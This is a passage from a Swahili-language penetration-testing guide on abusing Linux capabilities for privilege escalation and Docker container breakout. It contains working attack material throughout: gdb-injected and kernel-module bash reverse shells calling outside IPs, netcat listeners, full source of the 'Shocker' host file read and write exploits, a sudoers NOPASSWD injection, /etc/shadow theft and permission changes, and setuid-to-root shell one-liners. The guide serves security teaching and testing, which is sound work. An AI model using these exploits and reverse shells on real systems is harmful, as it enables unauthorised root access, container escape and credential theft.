(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

Hutaweza kuona matokeo ya amri iliyotekelezwa, lakini itatekelezwa na mchakato huo (kwa hiyo pata rev shell).

> [!WARNING]
> Ukipata hitilafu ya "No symbol "system" in current context.", angalia mfano uliotangulia wa kupakia shellcode kwenye programu kupitia gdb.

**Mfano wenye mazingira (Docker breakout) - Shellcode Injection**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya Docker container kwa kutumia:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root
```

Orodhesha **processes** zinazoendeshwa kwenye **host** `ps -eaf`

1. Pata **architecture** `uname -m`
2. Tafuta **shellcode** ya architecture hiyo ([https://www.exploit-db.com/exploits/41128](https://www.exploit-db.com/exploits/41128))
3. Tafuta **programu** ya **inject** **shellcode** kwenye memory ya process ([https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c](https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c))
4. **Badilisha** **shellcode** ndani ya program na **compile** `gcc inject.c -o inject`
5. **Inject** na upate **shell** yako: `./inject 299; nc 172.17.0.1 5600`

## CAP_SYS_MODULE

**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** huwezesha process **kupakia na kupakua kernel modules (`init_module(2)`, `finit_module(2)` na `delete_module(2)` system calls)**, na kuipa ufikiaji wa moja kwa moja kwa shughuli kuu za kernel. Uwezo huu una hatari kubwa za kiusalama kwa sababu kupakia module kunaweza kubadilisha tabia ya kernel na huenda kukwepa mipaka ya isolation.<sup>[[6]](#references)[[14]](#references)</sup>
Katika Linux container ya kawaida inayoendeshwa kama root, uwezo huu hulenga **shared host kernel**, na hivyo kuwa njia ya moja kwa moja ya breakout. Uwezo huu lazima uwe effective katika initial user namespace, kwa sababu upakiaji wa modules haujawekwa kwenye namespace. Runtime iliyotengwa na userspace-kernel au VM kama gVisor, Kata, au Hyper-V hubadilisha mipaka ya kernel inayoweza kufikiwa. Upakiaji wa modules bado unaweza kuzuiwa na `modules_disabled`, kernel lockdown, signature enforcement, seccomp, au LSM.<sup>[[14]](#references)</sup>

**Mfano wenye binary**

Katika mfano ufuatao, binary **`python`** ina capability hii.

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_module+ep
```

Kwa chaguomsingi, amri ya **`modprobe`** hukagua faili za orodha ya utegemezi na ramani katika saraka ya **`/lib/modules/$(uname -r)`**.\
Ili kutumia vibaya hili, tuunde folda bandia ya **lib/modules**:

```bash
mkdir lib/modules -p
cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
```

Kisha **compile moduli ya kernel ambayo mifano 2 yake unaweza kuipata hapa chini, kisha uinakili** kwenye folda hii:

```bash
cp reverse-shell.ko lib/modules/$(uname -r)/
```

Mwishowe, tekeleza msimbo wa Python unaohitajika ili kupakia moduli hii ya kernel:

```python
import kmod
km = kmod.Kmod()
km.set_mod_dir("/path/to/fake/lib/modules/5.0.0-20-generic/")
km.modprobe("reverse-shell")
```

**Mfano wa 2 wenye binary**

Katika mfano ufuatao, binary **`kmod`** ina capability hii.

```bash
getcap -r / 2>/dev/null
/bin/kmod = cap_sys_module+ep
```

Hii inamaanisha kuwa inawezekana kutumia amri **`insmod`** kuingiza kernel module. Fuata mfano ulio hapa chini ili kupata **reverse shell** kwa kutumia vibaya ruhusa hii.

**Mfano wa mazingira (Docker breakout)**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya Docker container kwa kutumia:

```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Ndani ya matokeo yaliyotangulia unaweza kuona kuwa uwezo wa **SYS_MODULE** umewashwa.<sup>[[14]](#references)</sup>

**Unda** **kernel module** itakayoendesha reverse shell na **Makefile** ya kuikompile:

```c:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

> [!WARNING]
> Herufi tupu kabla ya kila neno la make kwenye Makefile **lazima iwe tab, si nafasi**!

Endesha `make` ili uikompaili.

```bash
Make[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```

Mwishowe, anzisha `nc` ndani ya shell na **pakia module** kutoka shell nyingine, na uta-capture shell ndani ya mchakato wa nc:

```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```

**Msimbo wa mbinu hii ulinakiliwa kutoka maabara ya "Abusing SYS_MODULE Capability" ya** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

Mfano mwingine wa mbinu hii unapatikana kwenye [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)

## CAP_DAC_READ_SEARCH

[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) huruhusu process **kupita ukaguzi wa ruhusa za kusoma faili na kusoma na kutekeleza directories**. Pia huidhinisha `open_by_handle_at(2)`, ambayo hutafsiri file handle halali ikilinganishwa na file descriptor ya mount ya filesystem ileile iliyowekwa mount. Haifichui kiotomatiki kila faili iliyo nje ya mount namespace ya process. Kuvuka mipaka kwa kutumia file handle kunahitaji pia rejeleo la filesystem linalohusiana na host, handles halali au zinazoweza kugunduliwa, filesystem na mpangilio wa storage unaooana, na kutokuwepo kwa kizuizi cha runtime au LSM. Mbinu ya kihistoria ya Docker "Shocker" ilionyesha mchanganyiko huo kwenye mipangilio iliyoathirika, kama ilivyochambuliwa [hapa](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).<sup>[[12]](#references)[[13]](#references)[[14]](#references)</sup>
**Hii inamaanisha kuwa unaweza kupita ukaguzi wa ruhusa za kusoma faili na ukaguzi wa ruhusa za kusoma/kutekeleza directories**.<sup>[[14]](#references)</sup>

Kwa **executable maalum** yenye capability hii, kagua inachosoma na kurudisha kwa caller wake. Programu saidizi ya kuchanganua faili inayokubali pathname iliyolindwa iliyochaguliwa na caller pamoja na urefu wa prefix uliochaguliwa na caller, kisha kufichua digest kamili ya prefix hiyo, inaweza kutumika kama file-read oracle: baada ya kurejesha baiti za kwanza `n-1`, linganisha digest za wagombea kwa kila baiti inayowezekana inayofuata na digest ya helper kwa urefu `n`. Hili halitegemei kupata mgongano wa kriptografia au kutumia MD5 mahususi; linategemea maswali yanayorudiwa yenye urefu uliochaguliwa na digest zinazoonekana na zisizobadilika. Digest ya faili zima bila udhibiti wa prefix haithibitishi njia hiyo hiyo. Thibitisha kuwa caller anaweza kutekeleza helper, capability ya faili yake inakuwa effective, pathname iliyochaguliwa inaweza kufikiwa kwenye mount namespace yake, na tabia ya input/output ipo kweli. Usikimbize helper isiyojulikana yenye privileges ili kuijaribu wakati wa uchunguzi tulivu.

**Mfano wa binary**

Binary inaweza kusoma faili zinazoweza kufikiwa kwenye namespaces zake. Kwa hiyo, ikiwa faili kama `tar` ina capability hii, inaweza kusoma faili ya shadow:

```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```

**Mfano wenye binary2**

Katika hali hii, tuchukulie kuwa binary ya **`python`** ina capability hii. Ili kuorodhesha faili za root, unaweza kufanya hivi:

```python
import os
for r, d, f in os.walk('/root'):
    for filename in f:
        print(filename)
```

Na ili kusoma faili, unaweza kufanya:

```python
print(open("/etc/shadow", "r").read())
```

**Mfano katika Mazingira (Docker breakout)**

Unaweza kuangalia capabilities zilizowezeshwa ndani ya Docker container ukitumia `capsh --print`.<sup>[[14]](#references)[[26]](#references)</sup>

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

Katika matokeo yaliyotangulia unaweza kuona kuwa uwezo wa **DAC_READ_SEARCH** umewezeshwa. Uwezo huu huruka ukaguzi wa ruhusa za kusoma/kutafuta wa DAC na kuruhusu `open_by_handle_at(2)`; wenyewe si uwezo wa kutatua hitilafu za mchakato.<sup>[[14]](#references)</sup>

Unaweza kujifunza jinsi exploit ifuatayo inavyofanya kazi kwenye [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), lakini kwa kifupi, **CAP_DAC_READ_SEARCH** huruhusu kupita kwenye mfumo wa faili bila ukaguzi wa ruhusa na huruhusu `open_by_handle_at(2)`; hii inaweza kufichua faili zilizofunguliwa na michakato mingine wakati namespaces na mounts husika zinafikika.<sup>[[13]](#references)[[14]](#references)</sup>

Exploit ya awali inayotumia vibaya ruhusa hizi kusoma faili kutoka kwenye host inapatikana hapa: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c); ifuatayo ni **toleo lililorekebishwa linalokuruhusu kupitisha faili ya kusoma kama hoja ya kwanza na kuhifadhi matokeo kwenye faili**.<sup>[[12]](#references)</sup>

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
    unsigned int handle_bytes;
    int handle_type;
    unsigned char f_handle[8];
};

void die(const char *msg)
{
    perror(msg);
    exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
    fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
    h->handle_type);
    for (int i = 0; i < h->handle_bytes; ++i) {
        fprintf(stderr,"0x%02x", h->f_handle[i]);
        if ((i + 1) % 20 == 0)
        fprintf(stderr,"\n");
        if (i < h->handle_bytes - 1)
        fprintf(stderr,", ");
    }
    fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
    int fd;
    uint32_t ino = 0;
    struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
    };
    DIR *dir = NULL;
    struct dirent *de = NULL;
    path = strchr(path, '/');
    // recursion stops if path has been resolved
    if (!path) {
        memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
        oh->handle_type = 1;
        oh->handle_bytes = 8;
        return 1;
    }

    ++path;
    fprintf(stderr, "[*] Resolving '%s'\n", path);
    if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
        die("[-] open_by_handle_at");
    if ((dir = fdopendir(fd)) == NULL)
        die("[-] fdopendir");
    for (;;) {
        de = readdir(dir);
        if (!de)
        break;
        fprintf(stderr, "[*] Found %s\n", de->d_name);
        if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
            fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
            ino = de->d_ino;
            break;
        }
    }

    fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
    if (de) {
        for (uint32_t i = 0; i < 0xffffffff; ++i) {
            outh.handle_bytes = 8;
            outh.handle_type = 1;
            memcpy(outh.f_handle, &ino, sizeof(ino));
            memcpy(outh.f_handle + 4, &i, sizeof(i));
            if ((i % (1<<20)) == 0)
                fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
            if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
                closedir(dir);
                close(fd);
                dump_handle(&outh);
                return find_handle(bfd, path, &outh, oh);
            }
        }
    }
    closedir(dir);
    close(fd);
    return 0;
}


int main(int argc,char* argv[] )
{
    char buf[0x1000];
    int fd1, fd2;
    struct my_file_handle h;
    struct my_file_handle root_h = {
        .handle_bytes = 8,
        .handle_type = 1,
        .f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
    };

    fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

    read(0, buf, 1);

    // get a FS reference from something mounted in from outside
    if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
        die("[-] open");

    if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
        die("[-] Cannot find valid handle!");

    fprintf(stderr, "[!] Got a final handle!\n");
    dump_handle(&h);

    if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
        die("[-] open_by_handle");

    memset(buf, 0, sizeof(buf));
    if (read(fd2, buf, sizeof(buf) - 1) < 0)
        die("[-] read");

    printf("Success!!\n");

    FILE *fptr;
    fptr = fopen(argv[2], "w");
    fprintf(fptr,"%s", buf);
    fclose(fptr);

    close(fd2); close(fd1);

    return 0;
}
```

> [!WARNING]
> Exploit inahitaji kupata pointer inayoelekeza kwenye kitu kilichomountiwa kwenye host. Exploit ya awali ilitumia faili `/.dockerinit`, na toleo hili lililorekebishwa linatumia `/etc/hostname`. Ikiwa exploit haifanyi kazi, huenda ukahitaji kuweka faili tofauti. Ili kupata faili iliyomountiwa kwenye host, endesha tu amri ya `mount`:

![CAP SYS MODULE - CAP DAC READ SEARCH: Exploit inahitaji kupata pointer inayoelekeza kwenye kitu kilichomountiwa kwenye host. Exploit ya awali ilitumia faili /.dockerinit na toleo hili lililorekebishwa linatumia...](<../../images/image (407) (1).png>)

**Msimbo wa mbinu hii ulinakiliwa kutoka kwenye maabara ya "Abusing DAC_READ_SEARCH Capability" ya** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>


## CAP_DAC_OVERRIDE

**Capability hii hupita ukaguzi wa ruhusa za kusoma na kuandika faili, pamoja na ukaguzi mwingi wa ruhusa za kutekeleza**; kutekeleza faili ya kawaida bado kunahitaji angalau biti moja ya kutekeleza iwekwe. Haipuuzi mount ya kusoma tu, hali isiyobadilika, wala kunyimwa ruhusa na LSM.<sup>[[14]](#references)</sup>

Tafuta faili ambazo zinaweza kusomeka au kuandikika kwa kuwa mwanachama wa kundi lenye mamlaka; faili zinazofaa hutegemea umiliki na biti za mode za target.<sup>[[14]](#references)</sup>

**Mfano kwa binary**

Katika mfano huu, vim ina capability hii, kwa hiyo unaweza kurekebisha faili yoyote kama _passwd_, _sudoers_ au _shadow_:

```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```

**Mfano wenye binary 2**

Katika mfano huu, binary ya **`python`** itakuwa na uwezo huu. Unaweza kutumia python kubatilisha faili lolote:

```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```

**Mfano wenye environment + CAP_DAC_READ_SEARCH (Docker breakout)**

`CAP_DAC_READ_SEARCH` inaruhusu `open_by_handle_at(2)`, lakini **haipiti** ukaguzi wa ruhusa za kuandika. Kuandika kupitia handle iliyotatuliwa kunahitaji pia ufikiaji wa kuandika kwa effective filesystem UID/GID ya mchakato au ACL, au `CAP_DAC_OVERRIDE`. Marejeleo ya filesystem yanayohusika na host, file handles zinazotumika, mount inayoweza kuandikiwa, na sera za runtime/LSM lazima pia ziruhusu operesheni hiyo. Angalia effective capabilities na identity; hakuna capability moja peke yake inayothibitisha kuwa target ya host inaweza kuandikiwa. Tazama [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) na [open_by_handle_at(2)](https://man7.org/linux/man-pages/man2/open_by_handle_at.2.html).<sup>[[14]](#references)[[26]](#references)</sup>

Kwanza soma sehemu iliyotangulia inayohusu [**kutumia vibaya uwezo wa DAC_READ_SEARCH kusoma faili zozote**](linux-capabilities.md#cap_dac_read_search) za host na **compile** exploit.\
Mfano huu wa kihistoria unajaribu kufungua faili iliyotatuliwa kwa `O_RDWR`; hufaulu tu ikiwa masharti ya awali ya filesystem na ruhusa za kuandika yametimizwa:

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
  unsigned int handle_bytes;
  int handle_type;
  unsigned char f_handle[8];
};
void die(const char * msg) {
  perror(msg);
  exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
  fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
    h -> handle_type);
  for (int i = 0; i < h -> handle_bytes; ++i) {
    fprintf(stderr, "0x%02x", h -> f_handle[i]);
    if ((i + 1) % 20 == 0)
      fprintf(stderr, "\n");
    if (i < h -> handle_bytes - 1)
      fprintf(stderr, ", ");
  }
  fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
  int fd;
  uint32_t ino = 0;
  struct my_file_handle outh = {
    .handle_bytes = 8,
    .handle_type = 1
  };
  DIR * dir = NULL;
  struct dirent * de = NULL;
  path = strchr(path, '/');
  // recursion stops if path has been resolved
  if (!path) {
    memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
    oh -> handle_type = 1;
    oh -> handle_bytes = 8;
    return 1;
  }
  ++path;
  fprintf(stderr, "[*] Resolving '%s'\n", path);
  if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
    die("[-] open_by_handle_at");
  if ((dir = fdopendir(fd)) == NULL)
    die("[-] fdopendir");
  for (;;) {
    de = readdir(dir);
    if (!de)
      break;
    fprintf(stderr, "[*] Found %s\n", de -> d_name);
    if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
      fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
      ino = de -> d_ino;
      break;
    }
  }
  fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
  if (de) {
    for (uint32_t i = 0; i < 0xffffffff; ++i) {
      outh.handle_bytes = 8;
      outh.handle_type = 1;
      memcpy(outh.f_handle, & ino, sizeof(ino));
      memcpy(outh.f_handle + 4, & i, sizeof(i));
      if ((i % (1 << 20)) == 0)
        fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
      if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
        closedir(dir);
        close(fd);
        dump_handle( & outh);
        return find_handle(bfd, path, & outh, oh);
      }
    }
  }
  closedir(dir);
  close(fd);
  return 0;
}
int main(int argc, char * argv[]) {
  char buf[0x1000];
  int fd1, fd2;
  struct my_file_handle h;
  struct my_file_handle root_h = {
    .handle_bytes = 8,
    .handle_type = 1,
    .f_handle = {
      0x02,
      0,
      0,
      0,
      0,
      0,
      0,
      0
    }
  };
  fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
    "[***] The tea from the 90's kicks your sekurity again. [***]\n"
    "[***] If you have pending sec consulting, I'll happily [***]\n"
    "[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
  read(0, buf, 1);
  // get a FS reference from something mounted in from outside
  if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
    die("[-] open");
  if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
    die("[-] Cannot find valid handle!");
  fprintf(stderr, "[!] Got a final handle!\n");
  dump_handle( & h);
  if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
    die("[-] open_by_handle");
  char * line = NULL;
  size_t len = 0;
  FILE * fptr;
  ssize_t read;
  fptr = fopen(argv[2], "r");
  while ((read = getline( & line, & len, fptr)) != -1) {
    write(fd2, line, read);
  }
  printf("Success!!\n");
  close(fd2);
  close(fd1);
  return 0;
}
```

Ili kutoroka kwenye docker container, unaweza **kupakua** faili `/etc/shadow` na `/etc/passwd` kutoka kwa host, **kuongeza** **mtumiaji mpya** humo, na kutumia **`shocker_write`** kuyafunika. Kisha, **ingia** kupitia **ssh**.

**Msimbo wa mbinu hii ulinakiliwa kutoka kwenye maabara ya "Abusing DAC_OVERRIDE Capability" ya** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com).<sup>[[1]](#references)</sup>

## CAP_CHOWN

**Capability hii huruhusu process kubadilisha umiliki wa faili**.<sup>[[14]](#references)</sup>

**Mfano wenye binary**

Tuseme binary ya **`python`** ina capability hii; unaweza kubadilisha mmiliki wa faili kama **`shadow`**, kisha utumie ufikiaji unaopatikana kuirekebisha ikiwa ruhusa nyingine zinaruhusu:

```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```

Au kwa binary ya **`ruby`** iliyo na uwezo huu:

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## CAP_FOWNER

**Uwezo huu hupita ukaguzi wa umiliki kwa shughuli nyingi za faili, ikiwemo kubadilisha ruhusa**.<sup>[[14]](#references)</sup>

**Mfano kwa kutumia binary**

Ikiwa python ina uwezo huu, unaweza kubadilisha ruhusa za faili ya shadow, **kubadilisha nenosiri la root**, na kuongeza mamlaka:

```bash
python -c 'import os; os.chmod("/etc/shadow", 0o666)'
```

### CAP_SETUID

**Uwezo huu huruhusu mchakato kubadilisha effective user ID yake, kwa kuzingatia sheria za credentials na capabilities zinazotekelezwa na kernel**.<sup>[[14]](#references)</sup>

**Mfano wa binary**

Ikiwa python ina **uwezo** huu, unaweza kuutumia vibaya kwa urahisi sana ili kupandisha privileges hadi root:

```python
import os
os.setuid(0)
os.system("/bin/bash")
```

**Njia nyingine:**

```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```

Kwa executable **custom** yenye `CAP_SETUID` effective, kagua code path inayofikika badala ya kudhani kuwa capability pekee inatoa shell. Maandishi yanayodhibitiwa na caller yakitumika kama *format string* kwa [`printf`](https://man7.org/linux/man-pages/man3/printf.3.html) yanaweza kufichua au kubadilisha kumbukumbu ya process; mabadiliko muhimu ya privileges bado hutegemea call iliyo hatarini, input inayodhibitika, na kitendo kinachofuata baada ya `setuid(0)`. Ikiwa kitendo hicho kinaanzisha external helper kwa jina, hakikisha utambulisho effective wakati wa kuianzisha, `PATH` halisi, na kama directory inayotafutwa mapema zaidi inaweza kuandikiwa na caller na caller anaweza kuifikia. File capability isiyofanya kazi, `no_new_privs`, helper path isiyobadilika na inayoaminika, au branch isiyofikika hubadilisha matokeo. Kagua binary au source inayopatikana ukiwa offline; usiendeshe suspicious privileged helper wakati wa enumeration ya kawaida.

## CAP_SETGID

**Capability hii huruhusu process kubadilisha group ID yake effective, kwa kuzingatia sheria za credentials na capabilities zinazotekelezwa na kernel**.<sup>[[14]](#references)</sup>

Kuna faili nyingi unazoweza **kuandika juu yake ili kuongeza privileges,** [**unaweza kupata mawazo hapa**](../processes-crontab-systemd-dbus/payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**Mfano wa binary**

Katika hali hii unapaswa kutafuta faili za kuvutia ambazo group inaweza kusoma kwa sababu unaweza kuiga group yoyote:

```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```

Mara tu unapopata faili unaloweza kutumia vibaya (kwa kulisoma au kuliandika) ili kuongeza marupurupu, unaweza **kupata shell ukiigiza kuwa mwanachama wa kundi husika** kwa:

```python
import os
os.setgid(42)
os.system("/bin/bash")
```

Katika hali hii, utambulisho wa kundi la shadow uliigwa ili uweze kusoma faili `/etc/shadow`:

```bash
cat /etc/shadow
```

### Mnyororo wa pamoja: CAP_SETGID + CAP_CHOWN

Wakati uwezo wote wawili unapatikana kwenye helper ileile, mnyororo wa vitendo ni:

1. Badilisha EGID iwe `shadow` (au kundi jingine lenye haki za juu).
2. Tumia `chown` kwenye `/etc/shadow` kuweka UID yako huku ukibakiza kundi `shadow`.
3. Soma hash ya lengo na uifanyie crack/kisha pivot.

```python
import os

# Replace values with real IDs from `id` / `getent group shadow`
LAB_UID = 1000
SHADOW_GID = 42

os.setgid(SHADOW_GID)
os.chown("/etc/shadow", LAB_UID, SHADOW_GID)
os.system("grep '^root:' /etc/shadow > /tmp/root.hash")
```

Hii huepusha hitaji la kupata root kamili moja kwa moja na mara nyingi inatosha kuhamia kwenye mifumo mingine kwa kutumia tena credentials.

Ikiwa **docker** imesakinishwa, unaweza **kujifanya** kuwa mshiriki wa **docker group** na kuitumia vibaya kuwasiliana na [**docker socket** na kuongeza privileges](#writable-docker-socket).

## CAP_SETFCAP

**Capability hii huruhusu process kuweka file capabilities**.<sup>[[14]](#references)</sup>

**Mfano wa binary**

Ikiwa python ina **capability** hii, unaweza kuitumia vibaya kwa urahisi sana ili kuongeza privileges hadi root:

```python:setcapability.py
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Seti mpya ya capabilities za faili inapoandikwa, huchukua nafasi ya seti iliyokuwepo awali; ikiwa helper itaendeshwa baadaye ikiwa na capabilities mpya pekee, huenda isiwe tena na `CAP_SETFCAP` ya kusasisha faili nyingine.<sup>[[14]](#references)[[25]](#references)</sup>

Ukipata [SETUID capability](linux-capabilities.md#cap_setuid), unaweza kwenda kwenye sehemu yake ili kuona jinsi ya kuongeza privileges.

**Mfano wenye environment (Docker breakout)**

Seti ya kawaida ya capabilities ambayo Docker imeandika kwenye nyaraka zake inajumuisha **CAP_SETFCAP**, lakini seti halisi hutegemea usanidi wa runtime.<sup>[[19]](#references)</sup>
Unaweza kukagua capabilities za mchakato kwa kutumia:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
